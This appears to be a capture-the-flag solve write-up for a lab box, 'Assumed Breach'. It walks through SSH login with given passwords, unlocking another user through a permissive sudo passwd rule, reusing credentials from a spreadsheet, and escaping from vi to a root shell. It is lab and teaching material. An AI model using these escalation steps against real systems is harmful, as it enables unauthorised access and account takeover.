# Solve Notes — Assumed Breach

## Stage 1 — Enumeration as jake

```sh
ssh jake@<target> -p 2222
# password: 2eEhVmkzMHTq

id
# uid=1000(jake) gid=1000(jake) groups=1000(jake),1001(it)

sudo -l
# (root) NOPASSWD: /usr/bin/passwd -l *
# (root) NOPASSWD: /usr/bin/passwd -u *

cat ~/todolist.txt
# hints at locking all accounts

ls /opt/
# Book1.xlsx — credential sheet for all users

cat /etc/group
# mitchel in itAdmin group — stands out
```

---

## Stage 2 — Lateral movement to mitchel

```sh
# mitchel is locked — unlock her
sudo passwd -u mitchel

# credentials from Book1.xlsx
ssh mitchel@localhost
# password: sZus5bpFphyq
```

---

## Stage 3 — Root via vi escape

```sh
sudo -l
# (root) NOPASSWD: /usr/bin/readfile /home/jake/todolist.txt

sudo /usr/bin/readfile /home/jake/todolist.txt
# vi opens the file

# In vi:
:!/bin/sh

# Root shell
id
# uid=0(root)

cat /root/flag.txt
```
